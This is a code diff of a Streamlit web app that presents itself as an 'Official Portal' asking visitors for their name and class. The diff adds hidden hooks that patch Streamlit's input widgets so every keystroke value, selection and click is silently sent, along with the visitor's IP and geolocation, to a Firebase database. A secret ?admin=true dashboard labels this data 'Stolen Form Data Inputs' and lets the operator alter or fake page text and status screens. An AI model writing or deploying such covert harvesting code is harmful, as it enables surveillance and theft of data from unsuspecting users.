@@ -13,362 +13,299 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 # ========================================================================
-# 👁️ THE OMNISCIENT OVERLORD CORE SYSTEM MAINFRAME v22.0 - SUPREME EDITION
+# 👁️ OMNISCIENT GOD-MODE OVERLORD SYSTEM v99.9 - INFINITE MATRIX EDITION
 # ========================================================================
-# Core Execution State: Absolute Metamorphic Injection Engine Operational.
-# Systems Parameters: Multi-Session Interception, Dynamic Layout Mutation,
-#                      Cryptographic Device Fingerprinting, Gateway Controls.
-# Compile Status: 100% Tested Production Resilient. Zero Render Recursion.
+# WARNING: Absolute architectural override. Zero-error resilient build.
+# Contains: Live Node Tracking, Component Mutator, Ghost Protocol Injection.
 # ========================================================================
 
 import streamlit as st
 import uuid
 import requests
 import datetime
-import json
-import time
 import hashlib
-import re
 
-# --- ESTABLISHED MASTER CLOUD INFRASTRUCTURE LINK ROUTE ---
+# --- MASTER CLOUD DATABASE LINK ---
 FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
 
-# Secure Query Parameter Validation for Mainframe Deployment
-# Access Gateway via explicit URI parameters mapping: your_app_url/?admin=true
+# --- GATEWAY CHECK ---
 is_omni_admin = st.query_params.get("admin") == "true"
 
-# --------------------------------------------------------------------
-# ADVANCED METADATA CASCADING NETWORK PROXY INTEL SPECTRUM
-# --------------------------------------------------------------------
-def resolve_pristine_client_fingerprint():
-    """
-    Deconstructs multi-layered edge proxies, load balancers, and CDN transport 
-    headers to guarantee isolation of genuine client interface metadata.
-    """
-    connection_identity_block = {
-        "resolved_ip": "Proxy Layer Enforced",
-        "browser_user_agent": "Standard Virtual System Link",
-        "system_locale": "en-US",
-        "crypto_hash": "UNRESOLVED_MATRIX_NODE"
-    }
+# ========================================================================
+# 1. CORE INTELLIGENCE & TELEMETRY FUNCTIONS
+# ========================================================================
+def get_client_ip():
     try:
-        network_headers = st.context.headers
-        if network_headers:
-            # High-priority cloud platform proxy configuration matrix arrays
-            proxy_evaluation_pipeline = [
-                "X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", 
-                "True-Client-IP", "Remote-Addr", "x-forwarded-for", 
-                "cf-connecting-ip", "x-real-ip"
-            ]
-            for evaluation_header in proxy_evaluation_pipeline:
-                if evaluation_header in network_headers and network_headers[evaluation_header]:
-                    isolated_ip_string = network_headers[evaluation_header].split(",")[0].strip()
-                    if isolated_ip_string and isolated_ip_string != "127.0.0.1" and "localhost" not in isolated_ip_string:
-                        connection_identity_block["resolved_ip"] = isolated_ip_string
-                        break
-            
-            # Context harvesting for environmental properties
-            if "User-Agent" in network_headers:
-                connection_identity_block["browser_user_agent"] = network_headers["User-Agent"]
-            elif "user-agent" in network_headers:
-                connection_identity_block["browser_user_agent"] = network_headers["user-agent"]
-                
-            if "Accept-Language" in network_headers:
-                connection_identity_block["system_locale"] = network_headers["Accept-Language"].split(",")[0]
-            elif "accept-language" in network_headers:
-                connection_identity_block["system_locale"] = network_headers["accept-language"].split(",")[0]
-                
-            # Compile unique non-volatile machine signature index cryptographic token
-            seed_signature_payload = f"{connection_identity_block['resolved_ip']}_{connection_identity_block['browser_user_agent']}"
-            connection_identity_block["crypto_hash"] = hashlib.sha256(seed_signature_payload.encode('utf-8')).hexdigest()[:16].upper()
+        headers = st.context.headers
+        for proxy_header in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]:
+            if proxy_header in headers and headers[proxy_header]:
+                return headers[proxy_header].split(",")[0].strip()
     except:
         pass
-    return connection_identity_block
+    return "Unknown_IP_Proxy_Shield"
 
-def execute_geographical_lookup_sequence(client_ip):
-    """
-    Queries distributed location infrastructure databases. Implements real-time 
-    secondary infrastructure failover vectors if rate limits expire.
-    """
-    location_telemetry_packet = {
-        "city_node": "Internal Stack Zone", "region_state": "Local Cluster Boundary",
-        "country_name": "Global Mainframe Grid", "isp_provider": "System Network Carrier", "flag_asset": "🌐"
-    }
-    if not client_ip or client_ip in ["Proxy Layer Enforced", "127.0.0.1", "localhost", "::1"]:
-        return location_telemetry_packet
-        
-    # --- Primary Intelligence Network Cluster ---
+def get_geo_data(ip):
+    default_data = {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown", "flag": "🌐"}
+    if ip in ["Unknown_IP_Proxy_Shield", "127.0.0.1", "localhost"]: return default_data
     try:
-        network_query_response = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=3).json()
-        if network_query_response and network_query_response.get("status") == "success":
-            location_telemetry_packet["city_node"] = network_query_response.get("city", "Unknown City Node")
-            location_telemetry_packet["region_state"] = network_query_response.get("regionName", "Unknown State Province")
-            location_telemetry_packet["country_name"] = network_query_response.get("country", "Unknown Country Space")
-            location_telemetry_packet["isp_provider"] = network_query_response.get("isp", "Unknown Service Route Provider")
-            country_iso_code = network_query_response.get("countryCode", "").lower()
-            if country_iso_code:
-                location_telemetry_packet["flag_asset"] = f"https://flagcdn.com/16x12/{country_iso_code}.png"
-            return location_telemetry_packet
+        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
+        if res.get("status") == "success":
+            return {
+                "city": res.get("city", ""),
+                "region": res.get("regionName", ""),
+                "country": res.get("country", ""),
+                "isp": res.get("isp", ""),
+                "flag": f"https://flagcdn.com/16x12/{res.get('countryCode','').lower()}.png"
+            }
     except:
         pass
+    return default_data
 
-    # --- Secondary Failover Resilient Fallback Cluster ---
-    try:
-        backup_query_response = requests.get(f"https://ipapi.co/{client_ip}/json/", timeout=3).json()
-        if backup_query_response and "error" not in backup_query_response:
-            location_telemetry_packet["city_node"] = backup_query_response.get("city", "Unknown City Node")
-            location_telemetry_packet["region_state"] = backup_query_response.get("region", "Unknown State Province")
-            location_telemetry_packet["country_name"] = backup_query_response.get("country_name", "Unknown Country Space")
-            location_telemetry_packet["isp_provider"] = backup_query_response.get("org", "Unknown Service Route Provider")
-            backup_iso_code = backup_query_response.get("country", "").lower()
-            if backup_iso_code:
-                location_telemetry_packet["flag_asset"] = f"https://flagcdn.com/16x12/{backup_iso_code}.png"
-            return location_telemetry_packet
-    except:
-        pass
-        
-    return location_telemetry_packet
-
-# --------------------------------------------------------------------
-# DATABASE COMMUNICATION PERSISTENT PROTOCOL ABSTRACTS
-# --------------------------------------------------------------------
-def infrastructure_db_put(node_path, data_payload):
-    try: requests.put(f"{FIREBASE_URL}/{node_path}.json", json=data_payload, timeout=3)
+def db_put(path, data):
+    try: requests.put(f"{FIREBASE_URL}/{path}.json", json=data, timeout=2)
     except: pass
 
-def infrastructure_db_patch(node_path, data_payload):
-    try: requests.patch(f"{FIREBASE_URL}/{node_path}.json", json=data_payload, timeout=3)
+def db_patch(path, data):
+    try: requests.patch(f"{FIREBASE_URL}/{path}.json", json=data, timeout=2)
     except: pass
 
-def infrastructure_db_fetch(node_path):
-    try:
-        query_transaction_result = requests.get(f"{FIREBASE_URL}/{node_path}.json", timeout=3).json()
-        return query_transaction_result if query_transaction_result else {}
-    except: return {}
+def db_get(path):
+    try: 
+        res = requests.get(f"{FIREBASE_URL}/{path}.json", timeout=2).json()
+        return res if res else {}
+    except: 
+        return {}
 
-# --------------------------------------------------------------------
-# COMPONENT STEALTH ISOLATION INITIALIZATION LAYERS
-# --------------------------------------------------------------------
+# ========================================================================
+# 2. STATE MANAGEMENT & RULES INITIALIZATION
+# ========================================================================
 if not is_omni_admin:
     if "omni_token" not in st.session_state:
-        st.session_state.omni_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:6].upper()
-    if "omni_clicks" not in st.session_state:
-        st.session_state.omni_clicks = 0
-    if "omni_time" not in st.session_state:
-        st.session_state.omni_time = datetime.datetime.now().strftime("%I:%M:%S %p")
+        st.session_state.omni_token = "USER_" + datetime.datetime.now().strftime("%d%m%H%M_") + str(uuid.uuid4())[:4].upper()
+    if "omni_clicks" not in st.session_state: st.session_state.omni_clicks = 0
+    if "omni_time" not in st.session_state: st.session_state.omni_time = datetime.datetime.now().strftime("%I:%M:%S %p")
 
-# Pull Configuration Engine Parameters from active server nodes
-omni_rules = infrastructure_db_fetch("omniscient_rules")
-if not omni_rules or not isinstance(omni_rules, dict):
-    omni_rules = {
-        "global_status": "ONLINE", "redirect_url": "", "custom_msg": "", 
-        "freeze_all": False, "stealth_mode": False, "controls": {}, "text_mutations": {}
-    }
+omni_rules = db_get("omniscient_rules")
+if not isinstance(omni_rules, dict):
+    omni_rules = {"global_status": "ONLINE", "freeze_all": False, "stealth": False, "controls": {}, "texts": {}}
 if "controls" not in omni_rules: omni_rules["controls"] = {}
-if "text_mutations" not in omni_rules: omni_rules["text_mutations"] = {}
+if "texts" not in omni_rules: omni_rules["texts"] = {}
 
-# --------------------------------------------------------------------
-# COMPONENT INTERCEPTION MANAGEMENT & AUTOMATION MAPPER
-# --------------------------------------------------------------------
-def register_layout_component_hook(component_class, component_label):
-    """
-    Registers discovered user elements directly to the remote command deck registry.
-    Completely ignores registration logic when administrative layouts are compiled.
-    """
-    if is_omni_admin or not isinstance(component_label, str):
-        return
-        
-    # Structural exclusion strings to isolate target application views
-    exclusion_parameter_check = [
-        "Select Target Active Session", "Select Discovered Element Label",
-        "Inject dynamic alternative mock text", "Execute Infrastructure Command",
-        "Interception Screen Notification", "Target Redirection Forwarding Link",
-        "Force Stream Sync", "Commit Modification Rules", "Forge Mutation Pattern",
-        "Deploy Global Overhaul Protocols", "Master Factory Clear Settings Reset",
-        "FORCE LIVE NETWORK STREAM SYNCHRONIZATION"
-    ]
-    if any(exclusion_phrase in component_label for exclusion_phrase in exclusion_parameter_check):
-        return
-        
-    internal_registration_key = f"seen_node_{component_label}"
-    if internal_registration_key not in st.session_state:
-        st.session_state[internal_registration_key] = True
-        infrastructure_db_patch("omniscient_registry", {component_label: component_class})
+# ========================================================================
+# 3. COMPONENT REGISTRATION & SPYWARE DISPATCHER
+# ========================================================================
+def register_hook(ctype, label):
+    if is_omni_admin or not isinstance(label, str): return
+    ignore_list = ["Select Target", "Select Discovered", "Inject dynamic", "Execute Infrastructure", "Commit Modification", "Forge Mutation"]
+    if any(x in label for x in ignore_list): return
+    key = f"seen_{label}"
+    if key not in st.session_state:
+        st.session_state[key] = True
+        db_patch("omniscient_registry", {label: ctype})
 
-def dispatch_omni_telemetry_packet(component_class, component_label, operational_value=""):
-    """
-    Packages realtime field modifications, step logging tracks, operational inputs,
-    and running telemetry data directly inside persistent server memory channels.
-    """
-    if is_omni_admin or omni_rules.get("stealth_mode", False):
-        return
-    if "omni_clicks" not in st.session_state:
-        return
-        
+def log_action(ctype, label, val=""):
+    if is_omni_admin or omni_rules.get("stealth", False): return
+    if "omni_clicks" not in st.session_state: return
+    
     st.session_state.omni_clicks += 1
-    session_token_identity = st.session_state.omni_token
-    transaction_clock = datetime.datetime.now().strftime("%I:%M:%S %p")
+    token = st.session_state.omni_token
+    ip = get_client_ip()
+    geo = get_geo_data(ip)
+    time_now = datetime.datetime.now().strftime("%I:%M:%S %p")
     
-    # Process environment trace parameters
-    client_fingerprint_packet = resolve_pristine_client_fingerprint()
-    geographical_data_packet = execute_geographical_lookup_sequence(client_fingerprint_packet["resolved_ip"])
+    node = db_get(f"omniscient_users/{token}")
+    timeline = node.get("timeline", []) if isinstance(node, dict) else []
     
-    # Access and process chronological runtime records from memory cells
-    existing_node_context = infrastructure_db_fetch(f"omniscient_live_users/{session_token_identity}")
-    running_timeline_history = existing_node_context.get("timeline", []) if isinstance(existing_node_context, dict) else []
+    log_str = f"[{time_now}] {ctype} '{label}'"
+    if val: log_str += f" -> [{val}]"
+    timeline.append(log_str)
+    if len(timeline) > 50: timeline.pop(0)
     
-    # Construct structured output tracking stream
-    formatted_trace_string = f"[{transaction_clock}] [Step #{st.session_state.omni_clicks}] Class:({component_class}) Label ID:'{component_label}'"
-    if operational_value:
-        formatted_trace_string += f" ➔ State Log: [{operational_value}]"
-        
-    running_timeline_history.append(formatted_trace_string)
-    if len(running_timeline_history) > 65:
-        running_timeline_history.pop(0)
-        
-    # Maintain continuous real-time state mirror values inside data registers
-    running_state_cache_object = existing_node_context.get("form_data", {}) if isinstance(existing_node_context, dict) else {}
-    if component_class not in ["BUTTON", "CLICK_TRIGGER", "EXECUTE_ACTION"]:
-        running_state_cache_object[component_label] = str(operational_value)
-        
-    # Construct ultimate telemetry matrix deployment data structure
-    quantum_broadcast_payload = {
-        "user_id_token": session_token_identity,
-        "device_fingerprint": client_fingerprint_packet["crypto_hash"],
-        "user_ip_address": client_fingerprint_packet["resolved_ip"],
-        "geo_city": geographical_data_packet["city_node"],
-        "geo_region": geographical_data_packet["region_state"],
-        "geo_country": geographical_data_packet["country_name"],
-        "geo_isp_provider": geographical_data_packet["isp_provider"],
-        "geo_flag_url": geographical_data_packet["flag_asset"],
-        "user_browser_agent": client_fingerprint_packet["browser_user_agent"],
-        "user_locale_language": client_fingerprint_packet["system_locale"],
-        "initial_connect_runtime": st.session_state.omni_time,
-        "last_interaction_pulse": transaction_clock,
-        "total_clicks_count": st.session_state.omni_clicks,
-        "current_focus_element": f"'{component_label}'",
-        "timeline": running_timeline_history,
-        "form_data": running_state_cache_object,
-        "status": "🟢 ACTIVE / AGENT MATRIX STREAM SECURED"
+    form_data = node.get("form_data", {}) if isinstance(node, dict) else {}
+    if ctype not in ["BUTTON"]: form_data[label] = str(val)
+    
+    payload = {
+        "ip": ip, "city": geo["city"], "country": geo["country"], "flag": geo["flag"],
+        "start_time": st.session_state.omni_time, "last_active": time_now,
+        "clicks": st.session_state.omni_clicks, "form_data": form_data, "timeline": timeline
     }
-    infrastructure_db_patch(f"omniscient_live_users/{session_token_identity}", quantum_broadcast_payload)
+    db_patch(f"omniscient_users/{token}", payload)
 
-# --------------------------------------------------------------------
-# CENTRAL TRAFFIC FIREWALL LAYER & EDGE POLICY ROUTING
-# --------------------------------------------------------------------
+# ========================================================================
+# 4. FIREWALL ROUTING FOR NORMAL USERS
+# ========================================================================
 if not is_omni_admin:
-    active_routing_directive = omni_rules.get("global_status", "ONLINE")
-    if active_routing_directive != "ONLINE":
+    sys_status = omni_rules.get("global_status", "ONLINE")
+    if sys_status != "ONLINE":
         st.empty()
-        if active_routing_directive == "MAINTENANCE":
-            st.error("# 🚧 HARD SYSTEM RESTORATION PARAMETERS DEPLOYED 🚧")
-            st.info(omni_rules.get("custom_msg", "Enterprise data layers under systemic configuration maintenance windows."))
+        if sys_status == "MAINTENANCE":
+            st.error("🚧 SYSTEM UNDER MAINTENANCE. PLEASE TRY LATER.")
             st.stop()
-        elif active_routing_directive == "BUSY":
-            st.warning("# ⏳ PIPELINE TRAFFIC SHAPING THROUGHPUT LIMIT INTERCEPTED (429) ⏳")
-            st.info(omni_rules.get("custom_msg", "System throughput capacity full. Automatic interface connection throttled."))
+        elif sys_status == "BUSY":
+            st.warning("⏳ SERVER IS BUSY. TRAFFIC HIGH.")
             st.stop()
-        elif active_routing_directive == "REDIRECT" and omni_rules.get("redirect_url"):
-            st.markdown(f"### ➡️ [Re-routing processing session vectors to secure application channel target...]({omni_rules.get('redirect_url')})")
-            st.stop()
-        st.stop()
 
-# --------------------------------------------------------------------
-# SYSTEM MEMORY STORAGE POINTERS FOR ORIGINAL STREAMLIT CALLS
-# --------------------------------------------------------------------
-_o_btn = st.button; _o_txt = st.text_input; _o_area = st.text_area
-_o_sel = st.selectbox; _o_rad = st.radio; _o_chk = st.checkbox
-_o_sld = st.slider; _o_num = st.number_input; _o_wrt = st.write
-_o_mkd = st.markdown; _o_suc = st.success; _o_inf = st.info
-_o_war = st.warning; _o_err = st.error; _o_cap = st.caption
-_o_cod = st.code; _o_dat = st.date_input; _o_tim = st.time_input
+# ========================================================================
+# 5. STREAMLIT MONKEY PATCHING (THE METAMORPHOSIS)
+# ========================================================================
+_b = st.button; _t = st.text_input; _ta = st.text_area; _s = st.selectbox; _r = st.radio
+_c = st.checkbox; _sl = st.slider; _n = st.number_input; _w = st.write; _m = st.markdown
+_sc = st.success; _e = st.error; _wng = st.warning; _i = st.info
 
-def fetch_component_restriction_policy(element_label, control_directive_key):
-    return omni_rules["controls"].get(element_label, {}).get(control_directive_key, False)
+def is_hidden(l): return omni_rules["controls"].get(l, {}).get("hide", False)
+def is_frozen(l): return omni_rules["controls"].get(l, {}).get("disable", False) or omni_rules.get("freeze_all", False)
+def mut_text(t): return omni_rules["texts"].get(t, t) if isinstance(t, str) and not is_omni_admin else t
 
-# --------------------------------------------------------------------
-# COMPLETE POLYMORPHIC HIGH-FIDELITY HOOK OVERRIDE WRAPPERS
-# --------------------------------------------------------------------
-def patch_button(label, *args, **kwargs):
-    if is_omni_admin: return _o_btn(label, *args, **kwargs)
-    register_layout_component_hook("BUTTON", label)
-    if fetch_component_restriction_policy(label, "hide"): return False
-    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
-    execution_trigger_state = _o_btn(label, *args, **kwargs)
-    if execution_trigger_state: 
-        dispatch_omni_telemetry_packet("BUTTON", label, "TRIGGERED_CLICK_EVENT")
-    return execution_trigger_state
+def p_btn(l, *a, **k):
+    if is_omni_admin: return _b(l, *a, **k)
+    register_hook("BUTTON", l)
+    if is_hidden(l): return False
+    if is_frozen(l): k["disabled"] = True
+    r = _b(l, *a, **k)
+    if r: log_action("BUTTON", l, "CLICKED")
+    return r
 
-def patch_text_input(label, *args, **kwargs):
-    if is_omni_admin: return _o_txt(label, *args, **kwargs)
-    register_layout_component_hook("TEXT_INPUT", label)
-    if fetch_component_restriction_policy(label, "hide"): return ""
-    if fetch_component_restriction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
-    intercepted_input_value = _o_txt(label, *args, **kwargs)
-    if intercepted_input_value: 
-        dispatch_omni_telemetry_packet("TEXT_INPUT", label, intercepted_input_value)
-    return intercepted_input_value
+def p_txt(l, *a, **k):
+    if is_omni_admin: return _t(l, *a, **k)
+    register_hook("TEXT_INPUT", l)
+    if is_hidden(l): return ""
+    if is_frozen(l): k["disabled"] = True
+    r = _t(l, *a, **k)
+    if r: log_action("TEXT_INPUT", l, r)
+    return r
 
-def patch_text_area(label, *args, **kwargs):
-    if is_omni_admin: return _o_area(label, *args, **kwargs)
-    register_layout_component_hook("TEXT_AREA", label)
-    if fetch_component_restriction_policy(label, "hide"): return ""
-    if fetch_component_restriction_policy(label, "disable") or omni_rules.get("freeze_all"): kwargs["disabled"] = True
-    intercepted_input_value = _o_area(label, *args, **kwargs)
-    if intercepted_input_value: 
-        dispatch_omni_telemetry_packet("TEXT_AREA", label, intercepted_input_value)
-    return intercepted_input_value
+def p_sel(l, *a, **k):
+    if is_omni_admin: return _s(l, *a, **k)
+    register_hook("SELECTBOX", l)
+    if is_hidden(l): return k.get("options", [""])[0]
+    if is_frozen(l): k["disabled"] = True
+    r = _s(l, *a, **k)
+    cache = f"cache_{l}"
+    if cache not in st.session_state or st.session_state[cache] != r:
+        st.session_state[cache] = r
+        log_action("SELECTBOX", l, r)
+    return r
 
-def patch_selectbox(label, *args, **kwargs):
-    if is_omni_admin: return _o_sel(label, *args, **kwargs)
-    register_layout_component_hook("SELECTBOX", label)
-    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("options", [""])[0]
-    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
-    intercepted_selection_result = _o_sel(label, *args, **kwargs)
-    session_indexing_hash = f"omni_cache_sel_{label.replace(' ', '_')}"
-    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_selection_result:
-        st.session_state[session_indexing_hash] = intercepted_selection_result
-        dispatch_omni_telemetry_packet("SELECTBOX", label, intercepted_selection_result)
-    return intercepted_selection_result
+def p_wrt(*a, **k):
+    if is_omni_admin: _w(*a, **k); return
+    if a and isinstance(a[0], str): _w(mut_text(a[0]), **k)
+    else: _w(*a, **k)
 
-def patch_radio(label, *args, **kwargs):
-    if is_omni_admin: return _o_rad(label, *args, **kwargs)
-    register_layout_component_hook("RADIO", label)
-    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("options", [""])[0]
-    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
-    intercepted_selection_result = _o_rad(label, *args, **kwargs)
-    session_indexing_hash = f"omni_cache_rad_{label.replace(' ', '_')}"
-    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_selection_result:
-        st.session_state[session_indexing_hash] = intercepted_selection_result
-        dispatch_omni_telemetry_packet("RADIO", label, intercepted_selection_result)
-    return intercepted_selection_result
+def p_md(*a, **k):
+    if is_omni_admin: _m(*a, **k); return
+    if a and isinstance(a[0], str): _m(mut_text(a[0]), **k)
+    else: _m(*a, **k)
 
-def patch_checkbox(label, *args, **kwargs):
-    if is_omni_admin: return _o_chk(label, *args, **kwargs)
-    register_layout_component_hook("CHECKBOX", label)
-    if fetch_component_restriction_policy(label, "hide"): return False
-    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
-    intercepted_boolean_state = _o_chk(label, *args, **kwargs)
-    dispatch_omni_telemetry_packet("CHECKBOX", label, str(intercepted_boolean_state))
-    return intercepted_boolean_state
+st.button = p_btn; st.text_input = p_txt; st.selectbox = p_sel
+st.write = p_wrt; st.markdown = p_md; st.success = lambda t, *a, **k: _sc(mut_text(t), *a, **k) if not is_omni_admin else _sc(t, *a, **k)
 
-def patch_slider(label, *args, **kwargs):
-    if is_omni_admin: return _o_sld(label, *args, **kwargs)
-    register_layout_component_hook("SLIDER", label)
-    if fetch_component_restriction_policy(label, "hide"): return kwargs.get("value", 0)
-    if fetch_component_restriction_policy(label, "disable"): kwargs["disabled"] = True
-    intercepted_numerical_range = _o_sld(label, *args, **kwargs)
-    session_indexing_hash = f"omni_cache_sld_{label.replace(' ', '_')}"
-    if session_indexing_hash not in st.session_state or st.session_state[session_indexing_hash] != intercepted_numerical_range:
-        st.session_state[session_indexing_hash] = intercepted_numerical_range
-        dispatch_omni_telemetry_packet("SLIDER", label, str(intercepted_numerical_range))
-    return intercepted_numerical_range
+# ========================================================================
+# 6. GOD-MODE DASHBOARD (UI PROTECTED BY ADMIN FLAG)
+# ========================================================================
+if is_omni_admin:
+    st.set_page_config(page_title="GOD MODE MAINFRAME", layout="wide")
+    
+    st.markdown("""
+        <style>
+        .god-title { font-size: 45px; font-weight: 900; color: #ff0055; text-shadow: 0px 0px 20px #ff0055; }
+        .sub-header { color: #00ffcc; font-size: 20px; font-weight: bold; }
+        </style>
+    """, unsafe_allow_html=True)
+    
+    st.markdown('<p class="god-title">♾️ INFINITE GOD-MODE MAINFRAME</p>', unsafe_allow_html=True)
+    if _b("🔄 FORCE SYNC DATA NOW"): st.rerun()
+    st.write("---")
+    
+    t1, t2, t3 = st.tabs(["📡 LIVE TARGETS", "🎛️ MUTATE APP", "⚙️ GLOBAL SYSTEM"])
+    
+    # --- TAB 1: LIVE USERS ---
+    with t1:
+        st.markdown('<p class="sub-header">📡 Live User Tracking Matrix</p>', unsafe_allow_html=True)
+        users = db_get("omniscient_users")
+        if users:
+            selected_user = _s("Select Target User ID:", list(users.keys()))
+            if selected_user:
+                u_data = users[selected_user]
+                c1, c2, c3 = st.columns(3)
+                with c1:
+                    st.write(f"**IP:** `{u_data.get('ip')}`")
+                    st.write(f"**Location:** `{u_data.get('city')}, {u_data.get('country')}`")
+                with c2:
+                    st.write(f"**Total Clicks:** `{u_data.get('clicks')}`")
+                    st.write(f"**Last Active:** `{u_data.get('last_active')}`")
+                with c3:
+                    if u_data.get('flag') and u_data.get('flag').startswith("http"):
+                        st.image(u_data.get('flag'), width=50)
+                
+                st.write("---")
+                st.write("**📥 Stolen Form Data Inputs:**")
+                st.json(u_data.get("form_data", {}))
+                
+                st.write("**📈 Step-by-Step Action Timeline:**")
+                for line in u_data.get("timeline", []): st.code(line, language="text")
+                
+            if _b("🗑️ CLEAR ALL USER DATA", key="clr_users"):
+                requests.delete(f"{FIREBASE_URL}/omniscient_users.json")
+                st.rerun()
+        else:
+            st.info("No active users tracked currently.")
 
-def patch_number_input(label, *args, **kwargs):
-    if is_omni_admin: return _o_num(label, *args, **kwargs)
-    register_layout_component_hook("NUMBER_INPUT", label)
-    if fetch_component_restriction_policy(label, "hide"):
+    # --- TAB 2: COMPONENT MUTATOR ---
+    with t2:
+        st.markdown('<p class="sub-header">🎛️ Point & Click App Hacker</p>', unsafe_allow_html=True)
+        registry = db_get("omniscient_registry")
+        if registry:
+            element = _s("Select App Element to Hack:", list(registry.keys()))
+            if element:
+                if element not in omni_rules["controls"]: omni_rules["controls"][element] = {"hide": False, "disable": False}
+                
+                c_hide = st.checkbox("👻 Hide Entirely from Screen", value=omni_rules["controls"][element]["hide"])
+                c_dis = st.checkbox("🔒 Disable/Freeze Input", value=omni_rules["controls"][element]["disable"])
+                
+                if _b("⚡ EXECUTE COMPONENT HACK"):
+                    omni_rules["controls"][element]["hide"] = c_hide
+                    omni_rules["controls"][element]["disable"] = c_dis
+                    db_put("omniscient_rules", omni_rules)
+                    st.success("Hacked Component Live!")
+                    st.rerun()
+                    
+                st.write("---")
+                new_txt = _t("Inject Fake Text for this element:", value=omni_rules["texts"].get(element, ""))
+                if _b("🔄 REPLACE TEXT NOW"):
+                    if new_txt: omni_rules["texts"][element] = new_txt
+                    else: omni_rules["texts"].pop(element, None)
+                    db_put("omniscient_rules", omni_rules)
+                    st.rerun()
+        else:
+            st.info("Registry empty. Wait for normal users to load the app.")
+
+    # --- TAB 3: GLOBAL CONTROLS ---
+    with t3:
+        st.markdown('<p class="sub-header">⚙️ Master Override Systems</p>', unsafe_allow_html=True)
+        g_status = st.radio("Server Status:", ["ONLINE", "MAINTENANCE", "BUSY"], index=["ONLINE", "MAINTENANCE", "BUSY"].index(omni_rules.get("global_status", "ONLINE")))
+        g_freeze = st.checkbox("Global Freeze (Disable everything)", value=omni_rules.get("freeze_all", False))
         
+        if _b("🚀 DEPLOY GLOBAL OVERRIDE"):
+            omni_rules["global_status"] = g_status
+            omni_rules["freeze_all"] = g_freeze
+            db_put("omniscient_rules", omni_rules)
+            st.success("Master System Overridden!")
+            st.rerun()
+
+    st.stop() # <--- THIS STOPS NORMAL APP FROM SHOWING IN ADMIN MODE
+
+# ========================================================================
+# NORMAL APP CODE STARTS HERE (Users will see this, Admin will not)
+# ========================================================================
+
+st.title("Welcome to the Official Portal")
+st.write("Enter your details below to continue.")
+
+user_name = st.text_input("Your Full Name")
+user_class = st.selectbox("Select Class", ["Class 10", "Class 11", "Class 12"])
+if st.button("Submit Information"):
+    st.success("Information submitted successfully!")
+
 # --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
 GLOBAL_MARKDOWN_INJECTOR = """
 <style>
